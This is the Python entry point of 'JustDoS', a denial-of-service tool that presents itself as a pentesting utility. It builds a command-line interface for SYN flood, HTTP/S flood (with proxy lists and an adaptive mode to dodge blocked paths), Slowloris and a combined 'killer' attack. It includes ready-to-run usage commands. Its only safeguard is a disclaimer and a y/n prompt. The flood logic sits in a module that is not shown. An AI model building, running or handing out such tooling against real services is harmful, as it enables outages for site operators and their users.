#!/usr/bin/env python3
# main.py

"""
JustDos - An Advanced DoS Tool for Penetration Testing

Disclaimer:
This tool is intended for educational and authorized penetration testing purposes only.
The author is not responsible for any illegal use of this script.
Misusing this tool against systems without explicit permission is illegal and unethical.

---

Main entry point for the JustDos application.

This script handles:
- Parsing command-line arguments to select the attack mode and its parameters.
- Displaying a welcome banner and help information.
- Performing pre-flight checks (e.g., root privileges for certain attacks).
- Calling the appropriate attack function from the `engine.core` module.
"""

import sys
import os
import argparse
import multiprocessing as mp
from typing import NoReturn
import traceback

# Third-party libraries for UI
try:
    from termcolor import colored
    from pyfiglet import figlet_format
except ImportError as e:
    missing_module = str(e).split("'")[1]
    print(f"[!] ERROR: UI module '{missing_module}' is not installed.", file=sys.stderr)
    print(f"    Please run: pip install {missing_module}", file=sys.stderr)
    sys.exit(1)

# Import core attack functions
from engine.core import run_http_flood, run_syn_flood, run_slowloris_attack, run_killer_attack

def display_banner() -> None:
    """Prints the application's title banner and warnings."""
    banner = figlet_format("JustDoS", font="slant")
    print(colored(banner, "green"))
    print(colored("     An Advanced DoS tool for pentesting purposes\n", "green"))
    print(colored("="*60, "yellow"))
    print(colored("AUTHOR: Arash", "white", attrs=["bold"]))
    print(colored("ETHICAL WARNING: Use only on authorized systems!", "red", attrs=["bold"]))
    print(colored("="*60, "yellow"))

def check_root() -> bool:
    """
    Checks if the script is being run with root/administrator privileges.

    This is required for raw socket operations, such as those used in a SYN flood.

    Returns:
        bool: True if running as root, False otherwise.
    """
    # os.geteuid() is the standard way on Unix-like systems.
    return hasattr(os, 'geteuid') and os.geteuid() == 0

def ethical_warning_and_confirmation(target: str) -> None:
    """
    Displays an ethical warning and requires user confirmation to proceed.

    This is a crucial step to ensure users acknowledge the potential impact
    and legal implications of using the tool.

    Args:
        target (str): The target IP or domain to display in the warning.
    """
    print(colored("\n[!] ETHICAL WARNING [!]", "red", attrs=["bold"]))
    print(colored("This tool is designed for penetration testing and educational purposes only.", "yellow"))
    print(colored("You are solely responsible for your actions. Ensure you have explicit, written authorization", "yellow"))
    print(colored(f"before targeting any system. The configured target is: {target}", "yellow"))

    try:
        confirm = input("\nDo you have permission to proceed? (y/n): ").lower().strip()
        if confirm != 'y':
            print(colored("[!] Attack canceled by user.", "red"))
            sys.exit(0)
    except KeyboardInterrupt:
        print(colored("\n[!] Attack canceled by user.", "red"))
        sys.exit(0)

def create_parser() -> argparse.ArgumentParser:
    """
    Creates and configures the argument parser for the command-line interface.

    Returns:
        argparse.ArgumentParser: The configured parser instance.
    """
    parser = argparse.ArgumentParser(
        description="JustDoS - A powerful DoS testing tool.",
        formatter_class=argparse.RawTextHelpFormatter,
         epilog=colored(
            "--- General Usage Examples ---\n"
            "# SYN Flood with auto-detected CPU cores to port 80 for 60 seconds\n"
            "  sudo python3 main.py syn 192.168.1.10 80 -p $(nproc) -d 60\n\n"
            "# HTTP Flood using a manual path and proxies from a file with adaptive management\n"
            "  python3 main.py http example.com 80 -w 50 -d 120 --adaptive --path /login.php --use-proxies --proxy-file proxies.txt\n\n"
            "# HTTPS Flood with automatic crawling (100 workers)\n"
            "  python3 main.py http example.com 443 -w 100 --https\n\n"
            "# Slowloris Attack to exhaust server connection slots\n"
            "  python3 main.py slowloris example.com 80 -c 1000 -i 8 -d 300\n\n"
            "# Killer (Hybrid) Attack\n"
            "  python3 main.py killer example.com 80 -c 500 -i 10 -w 50 -d 120\n", "cyan"
        )
    )

    subparsers = parser.add_subparsers(dest="command", required=True, help="Select the attack mode")

    # --- SYN Flood Parser ---
    syn_parser = subparsers.add_parser("syn", help="Layer 4 SYN Flood attack (requires root privileges).")
    syn_parser.add_argument("target", help="Target IP address.")
    syn_parser.add_argument("port", type=int, help="Target port.")
    syn_parser.add_argument("-d", "--duration", type=int, default=60, help="Duration of the attack in seconds (default: 60).")
    syn_parser.add_argument("-p", "--processes", type=int, default=mp.cpu_count(), help=f"Number of parallel processes (default: {mp.cpu_count()} CPU cores).")
    syn_parser.add_argument("-r", "--rate-limit", type=int, default=0, help="Packet rate limit per second per process (0 for unlimited).")
    syn_parser.set_defaults(func=run_syn_flood, requires_root=True)

    # --- HTTP/S Flood Parser ---
    http_parser = subparsers.add_parser("http", help="Layer 7 HTTP/S Flood attack with a high-performance async engine.")
    http_parser.add_argument("target", help="Target IP address or domain name.")
    http_parser.add_argument("port", type=int, help="Target port (e.g., 80 for http, 443 for https).")
    http_parser.add_argument("-d", "--duration", type=int, default=60, help="Duration of the attack in seconds (default: 60).")
    http_parser.add_argument("-w", "--workers", type=int, default=50, help="Number of concurrent async workers (default: 50).")
    http_parser.add_argument("--https", action="store_true", help="Use HTTPS instead of HTTP.")
    http_parser.add_argument("--adaptive", action="store_true", help="Enable adaptive attack planner to avoid blocked paths.")
    http_parser.add_argument("--path", type=str, help="Specify a single attack path to bypass crawling (e.g., '/login.php').")
    http_parser.add_argument("--use-proxies", action="store_true", help="Enable the use of proxies from a file.")
    http_parser.add_argument("--proxy-file", type=str, help="Path to a .txt file containing a list of proxies (one per line).")
    http_parser.set_defaults(func=run_http_flood, requires_root=False)

    # --- Slowloris Parser ---
    slowloris_parser = subparsers.add_parser("slowloris", help="Layer 7 Slowloris attack to exhaust server connection resources.")
    slowloris_parser.add_argument("target", help="Target IP address or domain name.")
    slowloris_parser.add_argument("port", type=int, help="Target port.")
    slowloris_parser.add_argument("-d", "--duration", type=int, default=300, help="Duration of the attack in seconds (default: 300).")
    slowloris_parser.add_argument("-c", "--connections", type=int, default=500, help="Number of simultaneous connections to maintain (default: 500).")
    slowloris_parser.add_argument("-i", "--interval", type=int, default=10, help="Interval between sending keep-alive headers in seconds (default: 10).")
    slowloris_parser.set_defaults(func=run_slowloris_attack, requires_root=False)
    
    # --- Killer (Hybrid) Parser ---
    killer_parser = subparsers.add_parser("killer", help="Hybrid Slowloris and HTTP Flood attack.")
    killer_parser.add_argument("target", help="Target IP address or domain name.")
    killer_parser.add_argument("port", type=int, help="Target port.")
    killer_parser.add_argument("-d", "--duration", type=int, default=120, help="Duration of the attack in seconds (default: 120).")
    # Slowloris options
    killer_parser.add_argument("-c", "--connections", type=int, default=500, help="Number of simultaneous connections for Slowloris (default: 500).")
    killer_parser.add_argument("-i", "--interval", type=int, default=10, help="Slowloris keep-alive interval (default: 10).")
    # HTTP Flood options
    killer_parser.add_argument("-w", "--workers", type=int, default=50, help="Number of concurrent async workers for HTTP Flood (default: 50).")
    killer_parser.add_argument("--https", action="store_true", help="Use HTTPS for the HTTP Flood part.")
    killer_parser.add_argument("--path", type=str, help="Specify a single attack path for HTTP Flood.")
    killer_parser.set_defaults(func=run_killer_attack, requires_root=False)

    return parser

def main() -> NoReturn:
    """
    Main function to run the JustDos application.
    
    It parses arguments, performs pre-flight checks, and launches the
    selected attack.
    """
    display_banner()
    parser = create_parser()

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    try:
        args = parser.parse_args()

        # Pre-flight check for root privileges
        if hasattr(args, 'requires_root') and args.requires_root and not check_root():
            print(colored("\n[!] ERROR: This attack mode requires root privileges.", "red"))
            print(colored("    Please run the script with 'sudo'.", "yellow"))
            sys.exit(1)

        # Pre-flight check for ethical confirmation
        ethical_warning_and_confirmation(args.target)

        # Execute the selected attack function
        if hasattr(args, 'func'):
            args.func(args)
        else:
            # This case should not be reached if a command is required
            parser.print_help(sys.stderr)
            sys.exit(1)

    except KeyboardInterrupt:
        print(colored("\n[!] Program terminated by user.", "red"))
        sys.exit(0)
    except Exception as e:
        print(colored(f"\n[!] An unexpected error occurred: {e}", "red"))
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # This check is important for multiprocessing on some platforms (like Windows)
    # to prevent child processes from re-importing and re-executing the main script.
    mp.freeze_support()
    main()
